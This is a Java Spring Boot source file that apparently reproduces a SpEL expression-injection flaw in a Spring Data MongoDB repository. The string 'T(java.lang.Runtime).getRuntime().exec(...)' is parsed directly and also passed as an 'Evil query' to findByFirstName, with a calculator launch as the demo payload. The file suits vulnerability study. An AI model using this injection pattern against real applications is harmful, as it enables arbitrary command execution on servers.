package com.logbasex.accessingdatamongodb;

import com.logbasex.accessingdatamongodb.dto.Customer;
import com.logbasex.accessingdatamongodb.repository.CustomerRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.autoconfigure.data.mongo.MongoDataAutoConfiguration;
import org.springframework.boot.autoconfigure.mongo.MongoAutoConfiguration;
import org.springframework.data.mongodb.repository.config.EnableMongoRepositories;
import org.springframework.expression.spel.standard.SpelExpressionParser;

@SpringBootApplication(exclude = {MongoAutoConfiguration.class, MongoDataAutoConfiguration.class})
@EnableMongoRepositories(basePackageClasses = CustomerRepository.class)
public class AccessingDataMongodbApplication implements CommandLineRunner {
	
	@Autowired
	private CustomerRepository repository;
	
	public static void main(String[] args) {
		SpelExpressionParser parser = new SpelExpressionParser();
		parser.parseExpression("T(java.lang.Runtime).getRuntime().exec(\"gnome-calculator\")");
		//https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html#d0e11977
		//parse type
		parser.parseExpression("T(String)").getValue(Class.class);
		SpringApplication.run(AccessingDataMongodbApplication.class, args);
	}
	
	@Override
	public void run(String... args) {
		
		repository.deleteAll();
		
		// save a couple of customers
		repository.save(new Customer("Alice", "Smith"));
		
		// Normal query
//		repository.findByFirstName("Alice");
//		repository.findByLastName("Smith");
		
		// Evil query
		repository.findByFirstName("T(java.lang.Runtime).getRuntime().exec(\"gnome-calculator\")");
	}
}
